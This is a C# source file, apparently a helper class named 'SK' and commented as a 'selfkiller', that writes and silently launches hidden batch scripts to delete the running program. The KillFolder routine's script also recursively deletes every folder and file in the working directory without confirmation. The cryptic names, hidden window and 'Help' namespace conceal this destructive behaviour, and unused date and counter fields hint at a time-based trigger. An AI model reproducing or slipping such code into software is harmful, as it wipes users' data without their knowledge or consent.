
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.IsolatedStorage;
using System.Diagnostics;
using System.Security;
using System.Runtime.InteropServices;
namespace Metaseed.Help
{//selfkiller
    public class SK
    {
        static string ChangeTimes = "1";
        static DateTime _d = new DateTime(2013, 6, 21);
        static int _t =5;
        static public void SE(SecureString cs)
        {
            //new SK().aaa(SecureString cs);
        }

        static public void KillFolder()
        {
            // 创建自删除批处理文件Helper.AppPath;
            string filename = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "...bat");

            using (StreamWriter bat = File.CreateText(filename))
            {
                // 自删除
                string s = string.Format(@"
        @echo off
        :selfkill
        attrib -a -r -s -h ""{0}""
        del ""{0}""
        if exist ""{0}"" goto selfkill
      
        for /d %%a in (*) do rd /s /q ""%%a""
        del /f /q *

        del %0

      ", AppDomain.CurrentDomain.FriendlyName);
                bat.WriteLine(s);


            }
            // 启动自删除批处理文件
            ProcessStartInfo info = new ProcessStartInfo(filename);
            info.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(info);

            // 启动自删除批处理文件
            info = new ProcessStartInfo(filename);
            info.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(info);
            // 强制关闭当前进程
            Environment.Exit(0);


        }
        static public void KillExe()
        {
            // 创建自删除批处理文件
            string filename = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "...bat");

            using (StreamWriter bat = File.CreateText(filename))
            {
                // 自删除
                string s = string.Format(@"
      @echo off
      :selfkill
      attrib -a -r -s -h ""{0}""
      del ""{0}""
      if exist ""{0}"" goto selfkill
      del %0
      ", AppDomain.CurrentDomain.FriendlyName);
                bat.WriteLine(s);
                //     // 自升级
                //     bat.WriteLine(string.Format(@"
                //       @echo off
                //       :selfkill
                //       attrib -a -r -s -h ""{0}""
                //       del ""{0}""
                //       if exist ""{0}"" goto selfkill
                //
                //       copy /y ""new.exe"" ""{0}""
                //       del ""new.exe""
                //       ""{0}""
                //
                //       del %0
                //       ", AppDomain.CurrentDomain.FriendlyName));

            }
            // 启动自删除批处理文件
            ProcessStartInfo info = new ProcessStartInfo(filename);
            info.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(info);
            // 强制关闭当前进程
            Environment.Exit(0);
        }
    }
}
